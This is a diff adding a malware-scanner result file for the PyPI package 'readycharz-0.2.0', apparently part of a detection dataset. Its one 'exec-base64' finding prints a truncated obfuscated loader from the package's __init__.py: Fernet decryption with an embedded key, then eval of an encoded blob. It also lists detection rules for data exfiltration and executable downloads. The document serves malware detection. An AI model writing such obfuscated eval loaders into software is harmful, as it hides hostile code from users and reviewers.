@@ -1,0 +1,24 @@
+{
+    "issues": 1,
+    "errors": {},
+    "results": {
+        "dll-hijacking": {},
+        "download-executable": {},
+        "shady-links": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "obfuscation": {},
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": {},
+        "exec-base64": [
+            {
+                "location": "readycharz/__init__.py:323",
+                "code": "import base64 as ______;import marshal as ____;import zlib as __________;from cryptography.fernet import Fernet;import base64;__mikey__=\"Z2tDRzJXRTQtMWw0SUxoNFZ4OGdQcGJKWTd0MzRqMEl2bXpiRko5ZW1jcz0=\";mydata=\"674141414141426b4c7a672d6c6d5f724...e__(___))\n",
+                "message": "This package contains a call to the `eval` function with a `base64` encoded string as argument.\nThis is a common method used to hide a malicious payload in a module as static analysis will not decode the\nstring.\n"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/readycharz-0.2.0"
+}
